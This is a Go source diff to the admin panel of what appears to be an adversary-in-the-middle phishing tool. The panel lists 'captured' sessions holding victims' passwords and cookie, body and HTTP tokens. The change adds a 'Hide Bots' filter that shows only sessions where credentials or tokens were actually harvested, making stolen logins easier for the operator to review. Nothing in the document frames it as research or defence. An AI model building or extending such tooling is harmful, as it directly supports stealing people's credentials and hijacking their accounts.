@@ -779,11 +779,29 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 	// ── SESSIONS ──────────────────────────────────────────────────────────────
 	case "sessions":
 		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd(fmt.Sprintf("All Sessions (%d)", len(allSessions))))
-		if len(allSessions) == 0 {
+		hideBots := r.URL.Query().Get("hide_bots") == "1"
+		displaySessions := allSessions
+		if hideBots {
+			var filtered []*database.Session
+			for _, sess := range allSessions {
+				hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0
+				if sess.Password != "" || hasTokens {
+					filtered = append(filtered, sess)
+				}
+			}
+			displaySessions = filtered
+		}
+		toggleURL := "/admin/panel?tab=sessions&hide_bots=1"
+		toggleLabel := "Hide Bots"
+		if hideBots {
+			toggleURL = "/admin/panel?tab=sessions"
+			toggleLabel = "Show All"
+		}
+		b.WriteString(sectionHd(fmt.Sprintf("All Sessions (%d) &nbsp;<a href=\"%s\" class=\"btn btn-xs\" style=\"font-size:11px\">%s</a>", len(displaySessions), toggleURL, toggleLabel)))
+		if len(displaySessions) == 0 {
 			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
 		} else {
-			b.WriteString(sessionTable(allSessions, true))
+			b.WriteString(sessionTable(displaySessions, true))
 		}
 		b.WriteString(`</div>`)
 
